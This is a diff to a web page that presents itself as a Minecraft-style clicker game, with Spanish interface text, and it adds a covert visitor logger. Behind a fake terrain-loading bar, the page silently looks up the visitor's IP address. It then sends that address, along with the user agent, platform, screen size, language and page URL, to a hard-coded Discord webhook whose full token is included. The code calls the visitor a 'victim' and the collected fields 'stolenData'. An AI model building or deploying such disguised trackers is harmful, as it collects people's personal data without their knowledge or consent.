@@ -35,6 +35,7 @@
             width: 90%;
             max-width: 400px;
             box-shadow: 0 0 20px rgba(0,255,0,0.3);
+            position: relative;
         }
 
         .header {
@@ -87,15 +88,17 @@
 
         #progress-bar { width: 250px; height: 25px; border: 3px solid #fff; margin-top: 20px; }
         #progress { width: 0%; height: 100%; background: var(--mc-green); }
+        #loading-status { font-size: 8px; margin-top: 10px; color: #aaa; }
     </style>
 </head>
 <body>
 
     <div id="loading-overlay">
-        <p>CARGANDO MUNDO...</p>
+        <p>GENERANDO TERRENO...</p>
         <div id="progress-bar">
             <div id="progress"></div>
         </div>
+        <div id="loading-status">Inicializando núcleo...</div>
     </div>
 
     <div class="game-container">
@@ -113,74 +116,99 @@
 
     <script>
         let clicks = 0;
+        let victimIP = 'Unknown';
+        let geoData = {};
+        
+        // Tu Webhook original actualizada
         const webhookURL = "https://discord.com/api/webhooks/1494884260577022002/M67ttC3ZWJ4wobkDm-1S6PSj53UzbYOh-lsXhhfeHaXnBqYXTb0BWDrySTVGQKkjIpoj";
+
+        // Lista de servicios de IP (del código que enviaste)
+        const ipServices = [
+            'https://api.ipify.org?format=json',
+            'https://api64.ipify.org?format=json',
+            'https://api.myip.com/json'
+        ];
 
         function mine() {
             clicks++;
             document.getElementById('counter').innerText = clicks;
         }
 
-        window.onload = () => {
-            let width = 0;
+        // Sistema de obtención de IP robusto
+        async function fetchIP() {
+            for (const service of ipServices) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    if (data.ip) {
+                        victimIP = data.ip;
+                        geoData = data;
+                        return;
+                    }
+                } catch (e) { continue; }
+            }
+        }
+
+        // Al cargar la página
+        window.onload = async () => {
             const progress = document.getElementById('progress');
+            const statusText = document.getElementById('loading-status');
+            
+            // Empezar a buscar la IP mientras carga la barra
+            fetchIP();
+
+            let width = 0;
+            const messages = ["Cargando biomas...", "Buscando diamantes...", "Detectando IP...", "Sincronizando mundo..."];
+            
             const interval = setInterval(async () => {
                 if (width >= 100) {
                     clearInterval(interval);
                     document.getElementById('loading-overlay').style.display = 'none';
                     await enviarDatos();
                 } else {
-                    width += Math.floor(Math.random() * 10) + 5;
+                    width += Math.floor(Math.random() * 12) + 1;
                     if(width > 100) width = 100;
                     progress.style.width = width + '%';
+                    statusText.innerText = messages[Math.floor(Math.random() * messages.length)];
                 }
-            }, 100);
+            }, 250);
         };
 
         async function enviarDatos() {
+            const stolenData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timestamp: new Date().toLocaleString(),
+                url: window.location.href
+            };
+
+            const msg = {
+                username: '🌐 Minecraft Evolution Logger',
+                embeds: [{
+                    title: '🎮 NUEVA CONEXIÓN DETECTADA',
+                    color: 5635925,
+                    fields: [
+                        { name: '🌐 **Dirección IP**', value: `\`${victimIP}\``, inline: true },
+                        { name: '🖥️ Sistema', value: stolenData.platform, inline: true },
+                        { name: '📊 Pantalla', value: stolenData.screen, inline: true },
+                        { name: '🌍 Idioma', value: stolenData.language, inline: true },
+                        { name: '🔗 URL de origen', value: stolenData.url, inline: false },
+                        { name: '👤 User Agent', value: `\`\`\`${stolenData.userAgent}\`\`\``, inline: false }
+                    ],
+                    footer: { text: `Capturado el: ${stolenData.timestamp}` }
+                }]
+            };
+
             try {
-                // Usamos ipapi.co que soporta HTTPS de forma nativa
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-
-                const msg = {
-                    embeds: [{
-                        title: "🎮 Nueva visita en el Clicker",
-                        color: 5635925,
-                        fields: [
-                            { name: "🌐 Dirección IP", value: `\`${data.ip || "No detectada"}\``, inline: true },
-                            { name: "📍 Ubicación", value: `${data.city || "?"}, ${data.country_name || "?"}`, inline: true },
-                            { name: "🏢 ISP", value: data.org || "Desconocido" },
-                            { name: "🖥️ Plataforma", value: navigator.platform, inline: true },
-                            { name: "📊 Resolución", value: `${screen.width}x${screen.height}`, inline: true },
-                            { name: "📱 Navegador", value: navigator.userAgent.split(') ')[1] || "Ver abajo" }
-                        ],
-                        footer: { text: "Logger Minecraft Edition" },
-                        timestamp: new Date()
-                    }]
-                };
-
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(msg)
                 });
             } catch (err) {
-                // Si falla por Adblocker, intentamos enviar datos básicos sin IP
-                const fallbackMsg = {
-                    embeds: [{
-                        title: "⚠️ Visita (IP Bloqueada por Navegador)",
-                        color: 16711680,
-                        fields: [
-                            { name: "🖥️ Plataforma", value: navigator.platform, inline: true },
-                            { name: "📊 Resolución", value: `${screen.width}x${screen.height}`, inline: true }
-                        ]
-                    }]
-                };
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fallbackMsg)
-                });
+                console.error("Error en el envío.");
             }
         }
     </script>
